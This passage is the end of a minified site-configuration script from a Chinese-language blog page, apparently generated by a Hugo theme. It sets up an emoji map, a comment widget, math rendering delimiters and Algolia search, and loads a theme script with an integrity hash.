,sweat:"1f613.png",sweat_drops:"1f4a6.png",sweat_smile:"1f605.png",thinking_face:"1f914.png",thought_balloon:"1f4ad.png",tired_face:"1f62b.png",triumph:"1f624.png",two_hearts:"1f495.png",unamused:"1f612.png",upside_down_face:"1f643.png",weary:"1f629.png",white_frowning_face:"2639-fe0f.png",white_heart:"1f90d.png",wink:"1f609.png",woozy_face:"1f974.png",worried:"1f61f.png",yawning_face:"1f971.png",yellow_heart:"1f49b.png",yum:"1f60b.png",zany_face:"1f92a.png",zipper_mouth_face:"1f910.png",zzz:"1f4a4.png"},enableQQ:!1,highlight:!0,lang:"zh-CN",pageSize:10,placeholder:"你的评论 ...",recordIP:!0,serverURLs:"https://zdvjohji.lc-cn-n1-shared.com",visitor:!0}},math:{delimiters:[{display:!0,left:"$$",right:"$$"},{display:!0,left:"\\[",right:"\\]"},{display:!0,left:"\\begin{equation}",right:"\\end{equation}"},{display:!0,left:"\\begin{equation*}",right:"\\end{equation*}"},{display:!0,left:"\\begin{align}",right:"\\end{align}"},{display:!0,left:"\\begin{align*}",right:"\\end{align*}"},{display:!0,left:"\\begin{alignat}",right:"\\end{alignat}"},{display:!0,left:"\\begin{alignat*}",right:"\\end{alignat*}"},{display:!0,left:"\\begin{gather}",right:"\\end{gather}"},{display:!0,left:"\\begin{CD}",right:"\\end{CD}"},{display:!1,left:"$",right:"$"},{display:!1,left:"\\(",right:"\\)"}],strict:!1},search:{algoliaAppID:"",algoliaIndex:"",algoliaSearchKey:"",highlightTag:"em",maxResultLength:10,noResultsFound:"没有找到结果",snippetLength:30,type:"algolia"}}</script><script type=text/javascript src=/js/theme.min.c1d5acc03abc8af9ee0a42aa4e942566a338a3e29d21b6c9f11536101f6914ad.js integrity="sha256-wdWswDq8ivnuCkKqTpQlZqM4o+KdIbbJ8RU2EB9pFK0="></script></body></html>